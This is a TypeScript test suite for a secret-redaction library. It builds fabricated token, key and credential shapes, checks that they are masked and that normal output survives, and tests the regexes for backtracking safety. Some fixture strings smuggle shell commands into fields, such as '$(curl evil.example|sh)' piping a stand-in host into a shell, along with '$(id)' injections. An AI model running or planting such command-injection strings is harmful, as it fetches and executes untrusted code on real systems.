/**
 * The shared mask against public lists (spec 012 FR-080 delta 2026-11-01, T137, issue #1009; table: specs/012-claude-codex-adapters/secret-coverage.md).
 * One sample per shape, false positives, and linearity. Every sample is made up and built at run time, so no secret-looking literal
 * sits in this file (GitHub push protection). `npm run test:runtime-redact`.
 */
import * as assert from 'assert';
import * as fs from 'fs';
import * as path from 'path';
import { REDACT_MAX_CHARS, _maskSourcesForTest, maskBareTokenShapes, maskNoteText, maskSecretCommand, maskSecretUrl, maskTokenShapes, maskTokenShapesUnguarded, redact, redactMarkdown } from '../src/shared/redact';

/** A made-up run of n characters from a class: not random (a test that fails must fail the same way) and never a real key. */
const run = (n: number, chars = 'aB3dE6gH9jK2mN5pQ8sT1vW4yZ7'): string => { let s = ''; while (s.length < n) s += chars; return s.slice(0, n); };
const an = (n: number): string => run(n); // letters and digits
const hex = (n: number): string => run(n, '0a1b2c3d4e5f6a7b8c9d');
const up = (n: number): string => run(n, 'AB3DE6GH2JK7MN5PQ4ST');
const lo = (n: number): string => run(n, 'a3b6c9d2e5f8g1h4j7k');

/** family -> samples: each array member of `PREFIXED`, `TOKEN_SHAPES` or `PATTERNS` has its family, and removing it fails here. */
const FAMILIES: Record<string, string[]> = {
  awsKeyIds: ['AK' + 'IA' + up(16), 'AS' + 'IA' + up(16), 'AB' + 'IA' + up(16), 'AC' + 'CA' + up(16), 'A3' + 'TA' + up(16)],
  bedrock: ['AB' + 'SK' + an(120) + '==', 'bedrock-' + 'api-key-' + an(40)],
  google: ['AI' + 'za' + an(35), 'ya' + '29.' + an(40), 'GOC' + 'SPX-' + an(28), 'GO' + 'OG1' + up(50)],
  entra: [an(3) + '8' + 'Q~' + an(33)],
  altCloud: ['LT' + 'AI' + an(20)],
  doCloudflare: ['do' + 'p_v1_' + hex(64), 'do' + 'o_v1_' + hex(64), 'do' + 'r_v1_' + hex(64), 'v1.' + '0-' + hex(24) + '-' + hex(146), 'cf' + 'ut_' + an(40), 'cf' + 'at_' + an(40), 'cf' + 'k_' + an(40)],
  hosting: ['HR' + 'KU-' + an(60), 'fo' + '1_' + an(43), 'fm' + '1r_' + an(120), 'fm' + '2_' + an(120), 'vc' + 'p_' + an(50), 'vc' + 'k_' + an(50)],
  databases: ['sb' + 'p_' + hex(40), 'sb_' + 'secret_' + an(30), 'na' + 'pi_' + lo(50), 'psc' + 'ale_tkn_' + an(40), 'psc' + 'ale_pw_' + an(40), 'psc' + 'ale_oauth_' + an(40), 'Ast' + 'raCS:' + an(24) + ':' + hex(64), '4b' + '1d' + an(38), 'da' + 'pi' + hex(32)],
  infra: [an(14) + '.at' + 'lasv1.' + an(70), 'hv' + 's.' + an(90), 'hv' + 'b.' + an(140), 'dp' + '.pt.' + an(43), 'dp' + '.st.' + an(43), 'pu' + 'l-' + hex(40), 'op' + 's_eyJ' + an(250), 'A3' + '-' + up(6) + '-' + up(11) + '-' + up(5) + '-' + up(5) + '-' + up(5), 'AGE-' + 'SECRET-KEY-1' + up(58), 'ts' + 'key-' + an(40), 'sha' + '256~' + an(43)],
  github: ['gh' + 'p_' + an(36), 'gh' + 'o_' + an(36), 'gh' + 'u_' + an(36), 'gh' + 's_' + an(36), 'gh' + 'r_' + an(36), 'github' + '_pat_' + an(82)],
  gitlab: ['gl' + 'pat-' + an(20), 'gl' + 'dt-' + an(20), 'gl' + 'rt-' + an(20), 'gl' + 'ft-' + an(20), 'gl' + 'ffct-' + an(20), 'gl' + 'imt-' + an(25), 'gl' + 'agent-' + an(50), 'gl' + 'oas-' + an(64), 'gl' + 'soat-' + an(20), 'gl' + 'ptt-' + hex(40), 'gl' + 'cbt-a1_' + an(20), 'GR' + '1348941' + an(20)],
  atlassian: ['ATA' + 'TT3' + an(40)],
  ci: ['CCI' + 'PAT_' + an(30), 'CCI' + 'PRJ_' + an(30), 'sg' + 'p_' + hex(40), 'pa' + 't.' + an(22) + '.' + an(24) + '.' + an(20), 'PM' + 'AK-' + hex(24) + '-' + hex(34)],
  ai: ['sk' + '-' + an(40), 'sk' + '-proj-' + an(60), 'sk' + '-ant-api03-' + an(95), 'gs' + 'k_' + an(52), 'pp' + 'lx-' + an(48)],
  aiTools: ['hf' + '_' + an(34), 'api' + '_org_' + an(34), 'r8' + '_' + an(37), 'tv' + 'ly-' + an(32), 'ls' + 'v2_pt_' + hex(32) + '_' + hex(10)],
  registries: ['np' + 'm_' + an(36), 'py' + 'pi-Ag' + an(60), 'ruby' + 'gems_' + hex(48), 'CLO' + 'JARS_' + lo(60), 'AK' + 'Cp' + an(69), 'cm' + 'Vmd' + an(59), 'dc' + 'kr_pat_' + an(27)],
  mail: ['SG' + '.' + an(22) + '.' + an(43), 'ke' + 'y-' + hex(32), hex(32) + '-' + 'us12', 'xke' + 'ysib-' + hex(64) + '-' + an(16), 're' + '_' + an(8) + '_' + an(24), 'S' + 'K' + hex(32), 'EA' + 'AC' + an(120), '1234567' + '89012345' + '|' + an(30), 'A'.repeat(22) + 'B' + an(90)],
  payment: ['sk' + '_live_' + an(24), 'rk' + '_live_' + an(24), 'sk' + '_test_' + an(24), 'wh' + 'sec_' + an(32), 'sq' + '0atp-' + an(22), 'sq' + '0csp-' + an(43), 'EA' + 'AA' + an(60), 'rz' + 'p_live_' + an(14), 'FLW' + 'SECK-' + an(32) + '-X', 'access-' + 'production-' + hex(8) + '-' + hex(4) + '-' + hex(4) + '-' + hex(4) + '-' + hex(12), 'sh' + 'pat_' + hex(32), 'sh' + 'pss_' + hex(32), 'pd' + 'l_live_' + an(40), 'duf' + 'fel_live_' + an(43)],
  devTools: ['li' + 'n_api_' + an(40), 'nt' + 'n_' + an(46), 'sn' + 'tryu_' + hex(64), 'sn' + 'trys_' + an(80), 'gl' + 'c_' + an(40), 'gl' + 'sa_' + an(32) + '_' + hex(8), 'NR' + 'AK-' + up(27), 'NR' + 'II-' + an(32), 'NR' + 'JS-' + hex(19), 'dt' + '0c01.' + up(24) + '.' + up(64), 'ph' + 'x_' + an(40), 'sl' + '.' + an(135), 'pa' + 't' + an(14) + '.' + hex(64), 'pn' + 'u_' + an(36), 'rd' + 'me_' + lo(70), 'ship' + 'po_live_' + hex(40), 'EZ' + 'AK' + an(54), 'ic' + 'o-' + an(32), 'AP' + 'I-' + up(26), 'fi' + 'o-u-' + an(64), 's-' + 's4t2ud-' + hex(64), an(6) + '_' + an(29) + '_mmk', 'sm' + '_pat_' + an(16), 'tk' + '-us-' + an(48), 'p8' + 'e-' + an(32), 'sc' + '_' + an(10) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'eyJ' + 'rIjoi' + an(80)],
  skAntGlued: ['x' + 'sk-ant-' + an(8), '1' + 'sk-ant-' + an(12)],
  bearer: ['Bea' + 'rer ' + an(30)],
  jwt: ['ey' + 'J' + an(20) + '.ey' + 'J' + an(30) + '.' + an(30)],
  slack: ['xo' + 'xb-' + an(20), 'xa' + 'pp-1-' + an(20), 'xo' + 'xa-' + an(8)],
  slackLegacy: ['xo' + 'xo-1234-5678-9012-' + hex(16)],
  slackHook: ['https://hooks.sl' + 'ack.com/services/T' + up(8) + '/B' + up(8) + '/' + an(24)],
  discordHook: ['https://disc' + 'ord.com/api/webhooks/123456789012/' + an(60)],
  teamsHook: ['https://acme.web' + 'hook.office.com/webhookb2/' + hex(8) + '-' + hex(4) + '@' + hex(8) + '/IncomingWebhook/' + hex(32) + '/' + hex(8)],
  telegram: ['1234' + '56789:' + an(35), 'https://api.telegram.org/bot' + '123456789:' + an(35) + '/getMe'],
  discordBot: ['M' + 'T' + an(24) + '.' + an(6) + '.' + an(38)],
  keyBlock: ['-----BEGIN RSA PRI' + 'VATE KEY-----\n' + an(64) + '\n-----END RSA PRI' + 'VATE KEY-----', '-----BEGIN OPENSSH PRI' + 'VATE KEY-----\n' + an(64) + '\n-----END OPENSSH PRI' + 'VATE KEY-----', '-----BEGIN PRI' + 'VATE KEY-----\n' + an(64), '-----BEGIN PGP PRI' + 'VATE KEY BLOCK-----\n\n' + an(64) + '\n-----END PGP PRI' + 'VATE KEY BLOCK-----', '-----begin encrypted pri' + 'vate key-----\n' + an(64) + '\n-----end encrypted pri' + 'vate key-----'],
  authorization: ['Authori' + 'zation: ' + an(20)],
  cookie: ['Coo' + 'kie: sid=' + an(20) + '; other=' + an(10), 'set-coo' + 'kie: sid=' + an(20), 'Coo' + 'kie: a="' + an(20) + '"; b=' + an(10), 'Coo' + 'kie: sid=' + an(3000)],
  cookieQuoted: ['"Coo' + 'kie": "sid=' + an(20) + '"', '{"set-coo' + 'kie":"sid=' + an(20) + '"}', '\\"coo' + 'kie\\":\\"sid=' + an(20) + '\\"'],
  curlUser: ['curl -u me:p4' + 'ss' + an(8) + ' https://h', 'curl -fsSL --user "me:p4' + 'ss' + an(8) + '" h', 'curl -sSu me:p4' + 'ss' + an(8), 'curl --user=me:p4' + 'ss' + an(8), 'curl -u me:' + an(800)],
  urlCredential: ['https://user:p4' + 'ss' + an(8) + '@host.example/x', 'redis://:p4' + 'ss' + an(8) + '@host.example'],
  copilotTid: ['ti' + 'd=abcdef12;exp=1;' + an(20), 'ti' + 'd=abcdef12;exp=1;' + an(2500)],
  queryValue: ['https://x.example/a?code=' + an(20), 'https://x.blob.example/a?sv=2020&sig=' + an(30), 'https://x.example/a?X-Amz-' + 'Signature=' + hex(64), 'https://x.example/a?x-goog-' + 'signature=' + hex(64), 'https://x.blob.example/a?sig=' + an(5000)],
  named: ['aws_secret_' + 'access_key=' + an(40), 'AWS_SESSION_' + 'TOKEN=' + an(40), 'pass' + 'word=' + an(12), 'DB_PASS' + 'WORD=' + an(12), '"pass' + 'word": "' + an(12) + '"', '\\"client_' + 'secret\\":\\"' + an(30) + '\\"', 'api_' + 'key: ' + an(32), 'x-api-' + 'key: ' + an(32), 'token := "' + an(16) + '"', 'myApi' + 'Key=' + an(16), 'AccountKey=' + an(88), 'SharedAccessKey=' + an(44), '_authToken=' + hex(36), '_gitlab_session=' + hex(32), 'pwd=' + an(10), 'password=' + run(24, 'correct+horse+battery'),
    'aws_secret_' + 'access_key=/' + an(39), 'AccountKey=/' + an(87), 'pass' + 'word=$uperS3cret123', 'pass' + 'word=(Sup3rSecret99)', 'pass' + 'word=Sup3r(S3cret)99', 'pass' + 'word=Summer2024&Secure!9', 'pass' + 'word=Summer2024,Secure!9', 'pass' + 'word=Summer2024;Secure!9', 'pass' + 'word=Summer2024)Secure!9', 'pass' + 'word=Summer2024|Secure!9', 'pass' + 'word=Summer2024\\Secure!9', 'pass' + 'word=' + an(5000)],
  netrc: ['machine h.example login me pass' + 'word p4ss' + an(8), 'machine h.example\n  login me\n  pass' + 'word p4ss' + an(8), 'machine h.example pass' + 'word p4ss' + an(8)],
};

let count = 0;
for (const [family, samples] of Object.entries(FAMILIES)) {
  for (const s of samples) {
    count++;
    // the last characters of the secret itself (a URL credential's host and a bot URL's method are not secret)
    const body = s.replace(/@host\.example.*$|\/getMe$| https:\/\/h$|" h$|[\\"}]+$/, '').slice(-8);
    for (const [label, out] of [['redact', redact(`see ${s} now`, {})], ['maskTokenShapes', maskTokenShapes(`see ${s} now`, '[redacted]')]] as const) {
      assert.ok(out.includes('[redacted]'), `${family}: ${label} masks ${s.slice(0, 16)}…`);
      assert.ok(!out.includes(body), `${family}: ${label} leaves no tail of ${s.slice(0, 16)}…`);
    }
    assert.strictEqual(maskTokenShapes(s, '[s]'), maskTokenShapesUnguarded(s, '[s]'), `${family}: the guard changes nothing on ${s.slice(0, 16)}…`);
  }
}
// the start every shape shares: after `_`, a quote, an encoded byte, a JSON escape
for (const s of ['np' + 'm_' + an(36), 'sk' + '_live_' + an(24), 'AI' + 'za' + an(35)]) {
  for (const pre of ['_', '"', 'x=', '%3D', '=3D', '\\n', '`']) assert.ok(!redact(pre + s, {}).includes(s.slice(4)), `start after ${pre}`);
}

// Issue #1009's five, in both masks
for (const s of ['np' + 'm_' + an(36), 'AI' + 'za' + an(35), 'sk' + '_live_' + an(24), 'aws_secret_' + 'access_key=' + an(40), 'https://u:p4' + 'ss' + an(8) + '@h.example/']) {
  assert.notStrictEqual(redact(s, {}), s, `redact masks ${s.slice(0, 12)}`);
  assert.notStrictEqual(maskTokenShapes(s, '[redacted]'), s, `maskTokenShapes masks ${s.slice(0, 12)}`);
}
// What names the secret stays; the mask text is literal
assert.strictEqual(redact('aws_secret_' + 'access_key=' + an(40) + ' x', {}), 'aws_secret_access_key=[redacted] x');
assert.strictEqual(redact('"pass' + 'word": "' + an(12) + '"', {}), '"password": "[redacted]"');
assert.strictEqual(redact('https://u:p4' + 'ss' + an(8) + '@h.example/', {}), 'https://[redacted]@h.example/');
assert.strictEqual(redact('https://acme.web' + 'hook.office.com/webhookb2/' + an(40) + '/IncomingWebhook/' + hex(32) + ' x', {}), 'https://acme.webhook.office.com/webhookb2/[redacted] x');
assert.strictEqual(maskTokenShapes('pass' + 'word=' + an(12), '$&$1'), 'password=$&$1', 'a mask with $ is literal');
// One mask (FR-031): `redact` with no env is `maskTokenShapes` plus the cut; a second pass changes nothing
for (const s of Object.values(FAMILIES).flat()) {
  assert.strictEqual(redact(s, {}), maskTokenShapes(s, '[redacted]'), `one mask on ${s.slice(0, 16)}…`);
  assert.strictEqual(redact(redact(s, {}), {}), redact(s, {}), `idempotent on ${s.slice(0, 16)}…`);
  assert.strictEqual(maskTokenShapes(s, '[s]'), redact(s, {}).split('[redacted]').join('[s]'), `any mask text on ${s.slice(0, 16)}…`); // the folder-setup display has its own
}
// Key blocks: the text after END stays, a cut-off block hides to the end, a PUBLIC block and a certificate stay
{
  const body = an(64);
  assert.strictEqual(redact('a -----BEGIN EC PRI' + `VATE KEY-----\n${body}\n-----END EC PRI` + 'VATE KEY----- tail', {}), 'a [redacted] tail');
  assert.strictEqual(redact('a\n-----BEGIN PRI' + `VATE KEY-----\n${body}\nmore`, {}), 'a\n[redacted]');
  assert.ok(!redact(JSON.stringify({ private_key: '-----BEGIN PRI' + `VATE KEY-----\n${body}\n-----END PRI` + 'VATE KEY-----\n' }), {}).includes(body), 'a service account JSON');
  for (const k of ['PUBLIC KEY', 'CERTIFICATE', 'RSA PUBLIC KEY', 'PGP PUBLIC KEY BLOCK']) {
    const t = `-----BEGIN ${k}-----\n${body}\n-----END ${k}-----`;
    assert.strictEqual(redact(t, {}), t, `${k} stays`);
  }
  // mask, then cut (the order FR-080 keeps): a block across REDACT_MAX_CHARS leaves no part of its body
  const far = ' '.repeat(REDACT_MAX_CHARS - 40) + '-----BEGIN PRI' + `VATE KEY-----\n${body}\n`;
  assert.ok(!redact(far, {}).includes(body.slice(0, 8)), 'a key block across the cut');
}
// What a hook command shows (spec 061 FR-014): only the bare shapes. A name, header or cookie rule would let a repository hide its own shell syntax.
for (const c of ['gh api repos?state=open', 'run --state=' + an(30), 'password=abc1234$(curl evil.example|sh)', 'Coo' + 'kie: a=b; curl evil.example | sh', 'Authori' + 'zation: $(curl evil.example|sh)', 'curl -u a:$(curl evil.example|sh) x', 'https://a:$(id)@h.example', 'token: x1234567`id`']) {
  assert.strictEqual(maskBareTokenShapes(c, '[s]'), c, `a command keeps its text: ${c.slice(0, 40)}`);
}
for (const f of ['github', 'registries', 'payment', 'ai', 'mail']) {
  for (const s of FAMILIES[f]) {
    const m = maskBareTokenShapes(`--auth=$(curl x|sh) ${s} ; id`, '[s]');
    assert.ok(m.includes('[s]') && m.startsWith('--auth=$(curl x|sh) ') && m.endsWith(' ; id'), `the shape goes and the shell stays: ${s.slice(0, 16)}…`);
  }
}

// Every mask built on this one sees the new shapes
{
  const tok = 'np' + 'm_' + an(36);
  assert.ok(!redactMarkdown(`x**${tok}**`, `x${tok}`, {}).includes(tok), 'redactMarkdown');
  assert.ok(!maskSecretUrl(`https://x.example/a/${tok}`, {}).includes(tok), 'maskSecretUrl');
  assert.ok(!maskSecretCommand(`curl -d ${tok} x`, {}).includes(tok), 'maskSecretCommand');
  assert.ok(!maskNoteText(`note ${tok}`).text.includes(tok), 'maskNoteText');
}

// False positives: normal output stays (a fixture, so each line says what it is)
const STAYS = [
  // git and ids
  'commit 1a8317fa0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d', 'HEAD is now at 1a8317fa', 'merge-base 5f6ec56cfa6f8c67648d863582c7ae2f206d5c1c',
  'id 123e4567-e89b-12d3-a456-426614174000', 'session_id=123e4567-e89b-12d3-a456-426614174000', 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'etag "' + hex(32) + '"',
  // base64 in normal output
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'integrity sha512-' + run(86, 'Qm9keSBvZiBhIHBhY2thZ2UgaW4gYSBsb2NrIGZpbGU') + '==', 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' + run(60, 'vbqajDhA2l5n') + ' me@host',
  // file paths, also where a secret word is next to them
  '/usr/local/lib/node_modules/npm/bin/npm-cli.js', 'C:\\Users\\me\\AppData\\Roaming\\npm\\node_modules', 'src/shared/redact.ts:89:12', '~/.ssh/known_hosts', 'private_key=/home/me/.ssh/id_rsa_work_laptop', 'private_key=./keys/server_2026.pem', 'PWD=/home/me/projects/agent-durbar', 'password_file: /etc/app/secret.txt',
  // code and config
  'token: string', 'password: string;', 'apiKey: undefined', 'const token = getToken123();', 'token = getToken2(a, b);', 'token = await client.getAccessTokenFromConfig()', 'password=$DB_PASS', 'password=$db_pass_2', 'password=$env:DB', 'token_url=https://x.example/1', 'secret=https://x.example/page2', 'auth: https://login.example/v2', 'password: ${DB_PASSWORD}', 'token=%TOKEN%', 'api_key=<your-api-key>', 'secret: true', 'auth: false',
  // words beside a secret word
  'max_tokens=4096', 'input_tokens: 12345678', 'token_count: 12345678', 'tokens=99999999', 'primary_key=abc12345', 'sort_key: created_at_2026', 'public_key=abc12345xyz', 'keyboard: 12345678', 'compass=12345678', 'bypass=12345678', 'pass: 12 tests', 'password: required', 'author: someone1234',
  // near a prefix
  'npm_config_registry=https://registry.npmjs.org/', 'npm_package_version=1.2.3', 'sk-short', 'sk_test_x', 'sk_test_helpers', 'pk_live_' + an(24), 'cache-key-' + hex(32), 'xoxo-hugs-and-kisses', 'hf_token', 'secret_key_name', 'API-DOCS', 'glc_short', 'AIzaShort', 'key-short', 're_match', 'dp.pt.short', 'AKIA is a prefix', 'AKIAlowercase1234567',
  // prose and numbers that a saved note must keep (a mask in a note is for good)
  'Meeting: the cookie: stores your session for a day, ask Sam about renewal', 'cookie: my session bug', 'auth: 127.0.0.1:8080', 'pass: 1523/1523', 'token: 2026-11-01', 'token: CancellationTokenSource', 'Password: please-enter-your-password', 'secret: correcthorsebatterystaple',
  // Windows and relative paths
  'private_key=C:/keys/server_2026.pem', 'secret: C:/Users/me/secret1.txt', 'private_key=C:\\keys\\server_2026.pem', 'private_key=keys/server_2026.pem', 'token: dist/assets/index-a1b2.js', 'secret=../conf/key2.txt',
  // names that look like tokens, and things that only start like one
  'nfc_normalize_unicode_string_with_long_name', 'sgp_' + 'cross_validation_results_for_the_final_model_fit', 'sbp_' + 'cross_validation_results_for_the_final_model_fit', 'glc_' + 'cross_validation_results_for_the_final_model', 'figd_' + 'cross_validation_results_for_the_final', 'cfk_' + 'cross_validation_results_for_the_final_model', 'tskey-auth-kube-config-documentation-page', 'cfut_' + 'cross_validation_results_for_model_fitting_vx', 'ACCAGTTGCATGCATGCATG', 'ABIAGATTACAGATTACAGA', 'ico-' + hex(32) + '.css',
  // a token shape glued to a word is not one (except `sk-ant-`, on purpose)
  'x' + 'np' + 'm_' + an(36), 'my' + 'sk' + '_live_' + an(24), 'a' + 'gh' + 'p_' + an(36),
  // `-u` away from curl, and curl with no password
  'git push -u origin:main', 'docker run -u 1000:1000 img', 'curl -u me https://h', 'curl -H "Accept: text/plain" https://h:8080/x',
  // prose
  'The password must be at least 8 characters', 'Enter your token: then press return', 'the -----BEGIN marker', 'BEGIN PRIVATE KEY without dashes',
];
for (const s of STAYS) {
  assert.strictEqual(redact(s, {}), s, `stays: ${s.slice(0, 50)}`);
  assert.strictEqual(maskTokenShapes(s, '[redacted]'), s, `stays in maskTokenShapes: ${s.slice(0, 50)}`);
}

// Linear, part 1, with no clock: no pattern has a repeated group that holds a variable-length part, so backtracking cannot multiply.
{
  // Walks the source: for each group closed by an unbounded quantifier, is there a variable quantifier inside it? Only a group, not a class.
  const nested = (src: string): string | undefined => {
    const stack: Array<{ variable: boolean }> = [{ variable: false }];
    for (let i = 0; i < src.length; i++) {
      const c = src[i];
      if (c === '\\') { i++; continue; }
      if (c === '[') { i++; if (src[i] === '^') i++; if (src[i] === ']') i++; while (i < src.length && src[i] !== ']') { if (src[i] === '\\') i++; i++; } continue; }
      if (c === '(') { stack.push({ variable: false }); continue; }
      if (c === '+' || c === '*') { stack[stack.length - 1].variable = true; continue; }
      if (c === '{') {
        const e = src.indexOf('}', i);
        const [lo2, hi2] = src.slice(i + 1, e).split(',');
        if (hi2 !== undefined && hi2 !== lo2) stack[stack.length - 1].variable = true;
        i = e;
        continue;
      }
      if (c === ')') {
        const g = stack.pop() as { variable: boolean };
        const rest = src.slice(i + 1, i + 24);
        const q = /^(?:\+|\*|\{[0-9]+,\})/.test(rest);
        if (q && g.variable) return src.slice(Math.max(0, i - 40), i + 8);
        // a bounded repeat of a variable part, or a plain group: its inside is variable for the outer group too
        if (g.variable || /^(?:\?|\+|\*|\{[0-9]+,[0-9]*\})/.test(rest)) stack[stack.length - 1].variable = true;
      }
    }
    return undefined;
  };
  assert.ok(nested('(?:a+)+'), 'the walker sees a nested quantifier');
  assert.ok(nested('(?:a{1,3}b)*c'), 'the walker sees a bounded part inside an unbounded repeat');
  assert.strictEqual(nested('(?:ab|%[0-9]{2}){8,}'), undefined, 'a fixed-width part is fine');
  assert.strictEqual(nested('[a+]+(?:x){1,2}'), undefined, 'a class is not a group');
  const sources = _maskSourcesForTest();
  assert.ok(sources.length > 15, 'the sources are listed');
  for (const src of sources) assert.strictEqual(nested(src), undefined, `nested quantifier in ${src.slice(0, 60)}`);
}

// Linear, part 2 (adversarial runs): the `shapes` part of test-redact-growth.ts.

// A real image, whole, stays (every repo image: test-redact-images.ts).
{
  const png = fs.readFileSync(path.join(__dirname, '..', '..', 'build', 'icon.png')).toString('base64');
  const u = `data:image/png;base64,${png}`;
  assert.strictEqual(redact(u, {}), u.length > REDACT_MAX_CHARS ? redact(u.slice(0, REDACT_MAX_CHARS), {}) : u, 'build/icon.png as a data URL');
}
// The mechanism behind it, with made-up base64: not after `/` or `+`, and not when more base64 follows
for (const t of ['ab/' + 'EA' + 'AA' + an(70) + '/cd', 'ab+' + 'EA' + 'AA' + an(70), 'EA' + 'AA' + an(70) + '/cd', 'ab/' + 'EA' + 'AC' + an(120) + '+x', 'ab/' + 'AB' + 'SK' + an(120), '/AI' + 'za' + an(35), '+S' + 'K' + hex(32), 'SK' + hex(32) + '/']) assert.strictEqual(redact(t, {}), t, `base64 stays: ${t.slice(0, 16)}…`);

console.log(`redact shapes: all checks passed (${count} samples, ${STAYS.length} that stay)`);
